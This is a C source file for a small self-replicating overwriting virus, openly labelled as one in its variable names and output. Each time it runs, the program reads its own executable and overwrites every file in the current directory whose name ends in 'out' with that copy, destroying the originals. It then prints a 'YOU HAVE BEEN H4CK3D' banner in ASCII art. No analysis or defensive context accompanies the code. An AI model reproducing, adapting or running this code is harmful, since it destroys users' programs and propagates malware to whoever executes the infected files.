#include <stdio.h>
#include <stdlib.h>
#include <dirent.h>
#include <string.h>

char * GLOBAL_VIRUS_BUFFER;
long   VIRUS_SIZE = 0;

unsigned short SelfRead(char * ThisFile)
{
	FILE * Virus = 0;
	size_t BytesReaded = 0;
	
	
	if(!(Virus = fopen(ThisFile,"rb")))
	  return 0;
	if(fseek(Virus,0,SEEK_END)!=0)
	  return 0;
	if((VIRUS_SIZE=ftell(Virus))==-1)
	  return 0;
	printf("Virus size %ld\n",VIRUS_SIZE);
	
	rewind(Virus);
	
	if(!(GLOBAL_VIRUS_BUFFER = calloc(VIRUS_SIZE,1)))
	{
		fclose(Virus);
	 	return 0;
	}
	 
	if(VIRUS_SIZE!=(BytesReaded=fread(GLOBAL_VIRUS_BUFFER,1,VIRUS_SIZE,Virus)))
	 return 0;
	
	fclose(Virus);
	return 1;
}

int main(int argc, char * argv[])
{
	printf("%s\n\n",argv[0]);
	if(!SelfRead(argv[0]))
	  return 0;
	int i;
	DIR * ThisDirectory;
	char * FileName;
	FILE * Infection = 0;
	struct dirent * FileInfo;
	unsigned short FileNameSize;
	
	if(!(ThisDirectory=opendir(".")))
		return 0;
	
	
	while((FileInfo=readdir(ThisDirectory)))
	{
		FileName=FileInfo->d_name;
		FileNameSize = strlen(FileName); 
		
		if(FileNameSize>2)
		   if(FileName[FileNameSize-3]=='o' || FileName[FileNameSize-3]=='O')
		   	if(FileName[FileNameSize-2]=='u' || FileName[FileNameSize-2]=='U')
		   	 if(FileName[FileNameSize-1]=='t' || FileName[FileNameSize-1]=='T')
		   	 {
		   	 	if(!(Infection=fopen(FileName,"w+b")))
		   	 		continue;
		   	 		
		   	 	if(!fwrite(GLOBAL_VIRUS_BUFFER,1,VIRUS_SIZE,Infection))
		   	 		continue;
		   	 	fclose(Infection);
		   	 }

	}
	closedir(ThisDirectory);
	free(GLOBAL_VIRUS_BUFFER);
    printf("YOU HAVE BEEN H4CK3D\n");
    printf("     000000000                              000000000          000000000       \n"\
		   "   00:::::::::00                          00:::::::::00      00:::::::::00   \n"\
		   " 00:::::::::::::00                      00:::::::::::::00  00:::::::::::::00 \n"\
		   "0:::::::000:::::::0                    0:::::::000:::::::00:::::::000:::::::0\n"\
		   "0::::::0   0::::::0xxxxxxx      xxxxxxx0::::::0   0::::::00::::::0   0::::::0\n"\
		   "0:::::0     0:::::0 x:::::x    x:::::x 0:::::0     0:::::00:::::0     0:::::0\n"\
		   "0:::::0     0:::::0  x:::::x  x:::::x  0:::::0     0:::::00:::::0     0:::::0\n"\
		   "0:::::0 000 0:::::0   x:::::xx:::::x   0:::::0 000 0:::::00:::::0 000 0:::::0\n"\
		   "0:::::0 000 0:::::0    x::::::::::x    0:::::0 000 0:::::00:::::0 000 0:::::0\n"\
		   "0:::::0     0:::::0     x::::::::x     0:::::0     0:::::00:::::0     0:::::0\n"\
		   "0:::::0     0:::::0     x::::::::x     0:::::0     0:::::00:::::0     0:::::0\n"\
		   "0::::::0   0::::::0    x::::::::::x    0::::::0   0::::::00::::::0   0::::::0\n"\
		   "0:::::::000:::::::0   x:::::xx:::::x   0:::::::000:::::::00:::::::000:::::::0\n"\
		   " 00:::::::::::::00   x:::::x  x:::::x   00:::::::::::::00  00:::::::::::::00 \n"\
		   "   00:::::::::00    x:::::x    x:::::x    00:::::::::00      00:::::::::00   \n"\
		   "     000000000     xxxxxxx      xxxxxxx     000000000          000000000     \n");                                                                            
}
